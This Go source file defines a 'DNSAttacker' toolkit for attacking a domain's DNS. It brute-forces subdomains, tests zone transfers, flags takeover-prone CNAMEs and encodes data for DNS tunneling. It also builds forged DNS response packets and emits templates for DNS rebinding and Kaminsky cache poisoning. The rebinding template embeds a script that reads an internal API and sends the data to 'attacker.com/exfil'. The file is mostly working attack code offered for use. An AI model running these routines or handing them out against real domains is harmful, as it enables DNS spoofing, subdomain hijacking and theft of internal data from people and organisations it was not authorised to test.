package dns

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type DNSAttacker struct {
	Target     string
	Resolver   string
	Timeout    time.Duration
	Results    []DNSResult
	Subdomains []string
	Wordlist   []string
	RateLimit  time.Duration
	mu         sync.Mutex
}

type DNSResult struct {
	Domain     string
	RecordType string
	Records    []string
	IPs        []string
	Vulnerable bool
	VulnType   string
	Evidence   string
	Latency    time.Duration
}

func NewDNSAttacker(target string) *DNSAttacker {
	return &DNSAttacker{
		Target:     target,
		Resolver:   "8.8.8.8:53",
		Timeout:    5 * time.Second,
		Results:    make([]DNSResult, 0),
		Subdomains: make([]string, 0),
	}
}

func (d *DNSAttacker) SubdomainBruteforce(wordlist []string, threads int) {
	if len(wordlist) == 0 {
		wordlist = defaultSubdomains()
	}

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, word := range wordlist {
		wg.Add(1)
		go func(w string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			subdomain := w + "." + d.Target
			ips, err := d.resolve(subdomain)

			if err == nil && len(ips) > 0 {
				d.addResult(DNSResult{
					Domain:     subdomain,
					RecordType: "A",
					IPs:        ips,
				})
				d.mu.Lock()
				d.Subdomains = append(d.Subdomains, subdomain)
				d.mu.Unlock()
				fmt.Printf("[+] %s -> %v\n", subdomain, ips)
			}

			time.Sleep(d.RateLimit)
		}(word)
	}

	wg.Wait()
}

func (d *DNSAttacker) ZoneTransfer() bool {
	nsRecords, err := net.LookupNS(d.Target)
	if err != nil {
		return false
	}

	for _, ns := range nsRecords {
		conn, err := net.DialTimeout("tcp", ns.Host+":53", d.Timeout)
		if err != nil {
			continue
		}

		// AXFR query
		query := d.buildAXFRQuery(d.Target)
		conn.Write(query)

		buf := make([]byte, 65535)
		conn.SetReadDeadline(time.Now().Add(d.Timeout))
		n, err := conn.Read(buf)
		conn.Close()

		if err == nil && n > 12 {
			// Check if response contains records
			if n > 100 {
				d.addResult(DNSResult{
					Domain:     d.Target,
					RecordType: "AXFR",
					Vulnerable: true,
					VulnType:   "Zone Transfer",
					Evidence:   fmt.Sprintf("NS: %s returned %d bytes", ns.Host, n),
				})
				fmt.Printf("[!] Zone Transfer possible: %s\n", ns.Host)
				return true
			}
		}
	}

	return false
}

func (d *DNSAttacker) DNSRebinding(maliciousIP, legitimateIP string, ttl int) string {
	payload := fmt.Sprintf(`
DNS Rebinding Attack Configuration:
------------------------------------
Target Domain: %s
Malicious IP: %s
Legitimate IP: %s
TTL: %d seconds

Attack Flow:
1. Victim visits attacker-controlled page
2. First DNS response returns: %s (TTL=%d)
3. After TTL expires, second response: %s
4. JavaScript now has access to internal resource

Required DNS Server Config:
$TTL %d
@   IN  A   %s
; After TTL expires, switch to:
@   IN  A   %s

Sample Exploit:
<script>
setTimeout(function() {
    fetch('http://rebind.attacker.com/internal-api')
    .then(r => r.text())
    .then(data => {
        navigator.sendBeacon('https://attacker.com/exfil', data);
    });
}, %d000);
</script>
`, d.Target, maliciousIP, legitimateIP, ttl, legitimateIP, ttl, maliciousIP, ttl, legitimateIP, maliciousIP, ttl+5)

	return payload
}

func (d *DNSAttacker) SubdomainTakeover(threads int) {
	fingerprints := map[string][]string{
		"AWS S3":        {"NoSuchBucket", "The specified bucket does not exist"},
		"GitHub Pages":  {"There isn't a GitHub Pages site here"},
		"Heroku":        {"No such app", "herokucdn.com/error-pages/no-such-app"},
		"Azure":         {"404 Web Site not found"},
		"Shopify":       {"Sorry, this shop is currently unavailable"},
		"Fastly":        {"Fastly error: unknown domain"},
		"Pantheon":      {"404 error unknown site"},
		"Tumblr":        {"There's nothing here", "Whatever you were looking for doesn't currently exist"},
		"WordPress.com": {"Do you want to register"},
		"Zendesk":       {"Help Center Closed"},
		"Unbounce":      {"The requested URL was not found"},
		"Surge.sh":      {"project not found"},
		"Bitbucket":     {"Repository not found"},
		"Ghost":         {"The thing you were looking for is no longer here"},
		"Netlify":       {"Not Found - Request ID"},
		"Cargo":         {"If you're moving your domain away"},
		"Statuspage":    {"You are being redirected", "statuspage.io"},
		"HelpScout":     {"No settings were found for this company"},
		"Tilda":         {"Please renew your subscription"},
	}

	cnameRecords := make(map[string]string)

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, subdomain := range d.Subdomains {
		wg.Add(1)
		go func(sub string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			cname, err := net.LookupCNAME(sub)
			if err != nil || cname == sub+"." {
				return
			}

			d.mu.Lock()
			cnameRecords[sub] = cname
			d.mu.Unlock()

			// Check if CNAME target is resolvable
			_, err = net.LookupHost(cname)
			if err != nil {
				d.addResult(DNSResult{
					Domain:     sub,
					RecordType: "CNAME",
					Records:    []string{cname},
					Vulnerable: true,
					VulnType:   "Subdomain Takeover (Dangling CNAME)",
					Evidence:   fmt.Sprintf("CNAME %s is unresolvable", cname),
				})
				fmt.Printf("[!] Dangling CNAME: %s -> %s\n", sub, cname)
			}

			time.Sleep(d.RateLimit)
		}(subdomain)
	}

	wg.Wait()

	// HTTP fingerprinting
	for sub, cname := range cnameRecords {
		for service, patterns := range fingerprints {
			for _, pattern := range patterns {
				if strings.Contains(cname, strings.ToLower(service)) {
					d.addResult(DNSResult{
						Domain:     sub,
						RecordType: "CNAME",
						Records:    []string{cname},
						Vulnerable: true,
						VulnType:   fmt.Sprintf("Subdomain Takeover (%s)", service),
						Evidence:   pattern,
					})
					fmt.Printf("[!] Takeover possible: %s -> %s (%s)\n", sub, cname, service)
				}
			}
		}
	}
}

func (d *DNSAttacker) DNSCachePoisoning(spoofedIP string) string {
	payload := fmt.Sprintf(`
DNS Cache Poisoning Attack:
---------------------------
Target: %s
Spoofed IP: %s

Attack requires:
1. Race condition against legitimate DNS response
2. Correct Transaction ID prediction/bruteforce
3. Source port prediction

Kaminsky Attack Steps:
1. Query random.%s (non-existent subdomain)
2. Flood responses with spoofed answers including:
   - Answer: random.%s -> (any IP)
   - Additional: %s -> %s (poisoned)
3. If attacker wins race, cache is poisoned

Mitigation Check:
- DNSSEC enabled: dig +dnssec %s
- Source port randomization: Check if ports are predictable
- Transaction ID entropy: Check randomness
`, d.Target, spoofedIP, d.Target, d.Target, d.Target, spoofedIP, d.Target)

	return payload
}

func (d *DNSAttacker) EnumerateRecords() {
	recordTypes := []string{"A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA", "SRV", "PTR", "CAA", "DMARC", "SPF"}

	for _, rtype := range recordTypes {
		var records []string

		switch rtype {
		case "A":
			ips, err := net.LookupHost(d.Target)
			if err == nil {
				records = ips
			}
		case "AAAA":
			ips, err := net.LookupIP(d.Target)
			if err == nil {
				for _, ip := range ips {
					if ip.To4() == nil {
						records = append(records, ip.String())
					}
				}
			}
		case "CNAME":
			cname, err := net.LookupCNAME(d.Target)
			if err == nil {
				records = []string{cname}
			}
		case "MX":
			mxs, err := net.LookupMX(d.Target)
			if err == nil {
				for _, mx := range mxs {
					records = append(records, fmt.Sprintf("%d %s", mx.Pref, mx.Host))
				}
			}
		case "NS":
			nss, err := net.LookupNS(d.Target)
			if err == nil {
				for _, ns := range nss {
					records = append(records, ns.Host)
				}
			}
		case "TXT":
			txts, err := net.LookupTXT(d.Target)
			if err == nil {
				records = txts
			}
		case "DMARC":
			txts, err := net.LookupTXT("_dmarc." + d.Target)
			if err == nil {
				records = txts
			}
		case "SPF":
			txts, err := net.LookupTXT(d.Target)
			if err == nil {
				for _, txt := range txts {
					if strings.HasPrefix(txt, "v=spf1") {
						records = append(records, txt)
					}
				}
			}
		}

		if len(records) > 0 {
			d.addResult(DNSResult{
				Domain:     d.Target,
				RecordType: rtype,
				Records:    records,
			})
			fmt.Printf("[+] %s: %v\n", rtype, records)
		}
	}
}

func (d *DNSAttacker) WildcardDetection() bool {
	randomSub := fmt.Sprintf("randomnonexistent%d.%s", time.Now().UnixNano(), d.Target)
	ips, err := d.resolve(randomSub)

	if err == nil && len(ips) > 0 {
		d.addResult(DNSResult{
			Domain:     d.Target,
			RecordType: "WILDCARD",
			IPs:        ips,
			Evidence:   "Wildcard DNS configured",
		})
		fmt.Printf("[!] Wildcard DNS detected: *.%s -> %v\n", d.Target, ips)
		return true
	}

	return false
}

func (d *DNSAttacker) DNSTunneling(data string) []string {
	// Encode data into DNS queries
	encoded := encodeToHex(data)
	var queries []string

	chunkSize := 63 // Max label size
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]
		query := fmt.Sprintf("%s.%s", chunk, d.Target)
		queries = append(queries, query)
	}

	fmt.Printf("[*] Data encoded into %d DNS queries\n", len(queries))
	return queries
}

func (d *DNSAttacker) ReverseLookup(ipRange string, threads int) {
	ips := expandIPRange(ipRange)

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, ip := range ips {
		wg.Add(1)
		go func(ipAddr string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			names, err := net.LookupAddr(ipAddr)
			if err == nil && len(names) > 0 {
				d.addResult(DNSResult{
					Domain:     ipAddr,
					RecordType: "PTR",
					Records:    names,
				})
				fmt.Printf("[+] %s -> %v\n", ipAddr, names)
			}

			time.Sleep(d.RateLimit)
		}(ip)
	}

	wg.Wait()
}

func (d *DNSAttacker) DNSSpoofPacket(srcIP, dstIP string, txID uint16, spoofedIP string) []byte {
	// DNS response packet structure
	packet := make([]byte, 512)

	// Transaction ID
	packet[0] = byte(txID >> 8)
	packet[1] = byte(txID)

	// Flags: QR=1, AA=1, RD=1, RA=1
	packet[2] = 0x85
	packet[3] = 0x80

	// Questions: 1, Answers: 1
	packet[4] = 0x00
	packet[5] = 0x01
	packet[6] = 0x00
	packet[7] = 0x01

	// Authority and Additional: 0
	packet[8] = 0x00
	packet[9] = 0x00
	packet[10] = 0x00
	packet[11] = 0x00

	// Question section (domain name)
	offset := 12
	for _, part := range strings.Split(d.Target, ".") {
		packet[offset] = byte(len(part))
		offset++
		copy(packet[offset:], part)
		offset += len(part)
	}
	packet[offset] = 0x00
	offset++

	// Type A, Class IN
	packet[offset] = 0x00
	packet[offset+1] = 0x01
	packet[offset+2] = 0x00
	packet[offset+3] = 0x01
	offset += 4

	// Answer section (pointer to name)
	packet[offset] = 0xc0
	packet[offset+1] = 0x0c
	offset += 2

	// Type A, Class IN
	packet[offset] = 0x00
	packet[offset+1] = 0x01
	packet[offset+2] = 0x00
	packet[offset+3] = 0x01
	offset += 4

	// TTL (3600 seconds)
	packet[offset] = 0x00
	packet[offset+1] = 0x00
	packet[offset+2] = 0x0e
	packet[offset+3] = 0x10
	offset += 4

	// Data length (4 for IPv4)
	packet[offset] = 0x00
	packet[offset+1] = 0x04
	offset += 2

	// Spoofed IP
	ip := net.ParseIP(spoofedIP).To4()
	copy(packet[offset:], ip)
	offset += 4

	return packet[:offset]
}

func (d *DNSAttacker) resolve(domain string) ([]string, error) {
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			dialer := net.Dialer{Timeout: d.Timeout}
			return dialer.DialContext(ctx, "udp", d.Resolver)
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), d.Timeout)
	defer cancel()

	return resolver.LookupHost(ctx, domain)
}

func (d *DNSAttacker) buildAXFRQuery(domain string) []byte {
	query := make([]byte, 512)

	// Transaction ID
	query[0] = 0x00
	query[1] = 0x01

	// Flags: Standard query
	query[2] = 0x00
	query[3] = 0x00

	// Questions: 1
	query[4] = 0x00
	query[5] = 0x01

	// Answer, Authority, Additional: 0
	query[6] = 0x00
	query[7] = 0x00
	query[8] = 0x00
	query[9] = 0x00
	query[10] = 0x00
	query[11] = 0x00

	offset := 12
	for _, part := range strings.Split(domain, ".") {
		query[offset] = byte(len(part))
		offset++
		copy(query[offset:], part)
		offset += len(part)
	}
	query[offset] = 0x00
	offset++

	// Type AXFR (252), Class IN
	query[offset] = 0x00
	query[offset+1] = 0xfc
	query[offset+2] = 0x00
	query[offset+3] = 0x01
	offset += 4

	// TCP length prefix
	length := offset
	tcpQuery := make([]byte, length+2)
	tcpQuery[0] = byte(length >> 8)
	tcpQuery[1] = byte(length)
	copy(tcpQuery[2:], query[:length])

	return tcpQuery
}

func (d *DNSAttacker) LoadWordlist(path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		d.Wordlist = append(d.Wordlist, strings.TrimSpace(scanner.Text()))
	}

	return scanner.Err()
}

func (d *DNSAttacker) addResult(result DNSResult) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.Results = append(d.Results, result)
}

func (d *DNSAttacker) GetVulnerabilities() []DNSResult {
	var vulns []DNSResult
	for _, r := range d.Results {
		if r.Vulnerable {
			vulns = append(vulns, r)
		}
	}
	return vulns
}

func (d *DNSAttacker) ExportResults() string {
	data, _ := json.MarshalIndent(d.Results, "", "  ")
	return string(data)
}

func defaultSubdomains() []string {
	return []string{
		"www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
		"ns3", "ns4", "imap", "test", "admin", "administrator", "api", "dev",
		"staging", "stage", "beta", "app", "apps", "mobile", "m", "gateway",
		"vpn", "secure", "shop", "store", "portal", "login", "remote", "server",
		"web", "www2", "www3", "cloud", "cdn", "static", "assets", "images",
		"img", "media", "video", "files", "download", "downloads", "upload",
		"uploads", "backup", "backups", "db", "database", "mysql", "sql",
		"postgres", "mongo", "redis", "elastic", "elasticsearch", "kibana",
		"grafana", "prometheus", "jenkins", "ci", "git", "gitlab", "github",
		"svn", "repo", "repos", "docker", "k8s", "kubernetes", "rancher",
		"aws", "azure", "gcp", "oracle", "internal", "intranet", "extranet",
		"corp", "corporate", "office", "exchange", "owa", "autodiscover",
		"calendar", "meet", "meeting", "conference", "zoom", "teams",
		"slack", "chat", "support", "help", "helpdesk", "ticket", "tickets",
		"jira", "confluence", "wiki", "docs", "documentation", "kb",
		"status", "monitor", "monitoring", "health", "metrics", "logs",
		"syslog", "audit", "security", "sso", "auth", "oauth", "saml",
		"ldap", "ad", "directory", "dns", "ns", "mx", "relay", "proxy",
	}
}

func encodeToHex(s string) string {
	return fmt.Sprintf("%x", s)
}

func expandIPRange(ipRange string) []string {
	var ips []string

	if strings.Contains(ipRange, "-") {
		parts := strings.Split(ipRange, ".")
		if len(parts) == 4 {
			lastPart := parts[3]
			if strings.Contains(lastPart, "-") {
				rangeParts := strings.Split(lastPart, "-")
				start := 0
				end := 0
				fmt.Sscanf(rangeParts[0], "%d", &start)
				fmt.Sscanf(rangeParts[1], "%d", &end)

				for i := start; i <= end; i++ {
					ip := fmt.Sprintf("%s.%s.%s.%d", parts[0], parts[1], parts[2], i)
					ips = append(ips, ip)
				}
			}
		}
	} else if strings.Contains(ipRange, "/") {
		_, ipnet, err := net.ParseCIDR(ipRange)
		if err == nil {
			for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
				ips = append(ips, ip.String())
			}
		}
	} else {
		ips = append(ips, ipRange)
	}

	return ips
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
